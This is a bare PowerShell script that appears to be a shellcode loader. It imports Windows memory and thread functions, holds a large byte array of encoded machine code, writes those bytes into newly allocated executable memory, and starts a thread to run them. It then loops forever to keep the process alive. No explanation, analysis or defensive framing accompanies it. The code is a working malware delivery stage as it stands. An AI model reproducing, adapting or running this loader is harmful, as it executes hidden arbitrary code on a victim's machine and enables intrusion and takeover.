$qpP8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $qpP8 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x1d,0xb1,0x94,0x67,0xdb,0xcd,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x75,0x0f,0x03,0x75,0x12,0x53,0x61,0x9b,0xc4,0x11,0x8a,0x64,0x14,0x76,0x02,0x81,0x25,0xb6,0x70,0xc1,0x15,0x06,0xf2,0x87,0x99,0xed,0x56,0x3c,0x2a,0x83,0x7e,0x33,0x9b,0x2e,0x59,0x7a,0x1c,0x02,0x99,0x1d,0x9e,0x59,0xce,0xfd,0x9f,0x91,0x03,0xff,0xd8,0xcc,0xee,0xad,0xb1,0x9b,0x5d,0x42,0xb6,0xd6,0x5d,0xe9,0x84,0xf7,0xe5,0x0e,0x5c,0xf9,0xc4,0x80,0xd7,0xa0,0xc6,0x23,0x34,0xd9,0x4e,0x3c,0x59,0xe4,0x19,0xb7,0xa9,0x92,0x9b,0x11,0xe0,0x5b,0x37,0x5c,0xcd,0xa9,0x49,0x98,0xe9,0x51,0x3c,0xd0,0x0a,0xef,0x47,0x27,0x71,0x2b,0xcd,0xbc,0xd1,0xb8,0x75,0x19,0xe0,0x6d,0xe3,0xea,0xee,0xda,0x67,0xb4,0xf2,0xdd,0xa4,0xce,0x0e,0x55,0x4b,0x01,0x87,0x2d,0x68,0x85,0xcc,0xf6,0x11,0x9c,0xa8,0x59,0x2d,0xfe,0x13,0x05,0x8b,0x74,0xb9,0x52,0xa6,0xd6,0xd5,0x97,0x8b,0xe8,0x25,0xb0,0x9c,0x9b,0x17,0x1f,0x37,0x34,0x1b,0xe8,0x91,0xc3,0x5c,0xc3,0x66,0x5b,0xa3,0xec,0x96,0x75,0x67,0xb8,0xc6,0xed,0x4e,0xc1,0x8c,0xed,0x6f,0x14,0x38,0xeb,0xe7,0x9d,0xbd,0xf3,0xf0,0xc9,0xbf,0xf3,0xff,0xb2,0x49,0x15,0xaf,0x94,0x19,0x8a,0x0f,0x45,0xda,0x7a,0xe7,0x8f,0xd5,0xa5,0x17,0xb0,0x3f,0xce,0xbd,0x5f,0x96,0xa6,0x29,0xf9,0xb3,0x3d,0xc8,0x06,0x6e,0x38,0xca,0x8d,0x9d,0xbc,0x84,0x65,0xeb,0xae,0x70,0x86,0xa6,0x8d,0xd6,0x99,0x1c,0xbb,0xd6,0x0f,0x9b,0x6a,0x81,0xa7,0xa1,0x4b,0xe5,0x67,0x59,0xbe,0x7e,0xa1,0xcf,0x01,0xe8,0xce,0x1f,0x82,0xe8,0x98,0x75,0x82,0x80,0x7c,0x2e,0xd1,0xb5,0x82,0xfb,0x45,0x66,0x17,0x04,0x3c,0xdb,0xb0,0x6c,0xc2,0x02,0xf6,0x32,0x3d,0x61,0x06,0x0e,0xe8,0x4f,0x7c,0x7e,0x28;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kmz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kmz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kmz,0,0,0);for (;;){Start-sleep 60};
